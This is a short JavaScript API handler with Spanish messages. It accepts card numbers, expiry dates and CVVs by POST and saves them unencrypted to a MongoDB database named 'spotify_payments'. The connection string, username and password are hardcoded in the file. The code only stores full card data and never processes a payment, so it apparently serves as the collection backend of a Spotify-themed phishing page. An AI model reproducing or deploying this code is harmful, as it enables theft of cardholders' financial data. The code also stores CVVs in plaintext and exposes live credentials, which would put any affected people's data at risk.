import { MongoClient } from 'mongodb';

export default async function handler(req, res) {
    console.log('Iniciando handler de tarjetas');
    
    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            message: `Método ${req.method} no permitido`
        });
    }

    let client;
    try {
        // 1. Validar datos
        const { cardNumber, expiryDate, cvv } = req.body;
        
        if (!cardNumber || !expiryDate || !cvv) {
            return res.status(400).json({
                success: false,
                message: 'Faltan campos requeridos'
            });
        }

        // 2. Conectar a MongoDB
        const MONGODB_URI = 'mongodb+srv://Mat1520:Matias2004@cluster0.so39idr.mongodb.net/spotify_payments?retryWrites=true&w=majority';
        
        client = new MongoClient(MONGODB_URI);
        await client.connect();
        
        // 3. Guardar datos
        const db = client.db('spotify_payments');
        const collection = db.collection('cards');
        
        const cardDoc = {
            cardNumber: cardNumber,
            expiryDate: expiryDate,
            cvv: cvv,
            createdAt: new Date()
        };

        const result = await collection.insertOne(cardDoc);

        return res.status(200).json({
            success: true,
            message: 'Tarjeta guardada exitosamente',
            cardId: result.insertedId
        });

    } catch (error) {
        console.error('Error:', error);
        
        return res.status(500).json({
            success: false,
            message: 'Error al guardar la tarjeta',
            error: error.message
        });

    } finally {
        if (client) {
            await client.close();
        }
    }
} 